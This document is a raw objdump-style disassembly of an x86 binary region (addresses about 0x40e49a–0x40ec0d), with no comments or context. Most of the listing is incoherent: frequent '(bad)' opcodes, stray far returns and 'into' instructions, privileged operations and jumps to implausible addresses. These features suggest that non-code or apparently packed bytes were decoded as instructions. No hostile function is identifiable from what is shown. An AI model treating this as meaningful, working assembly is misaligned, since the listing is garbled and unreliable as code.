  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
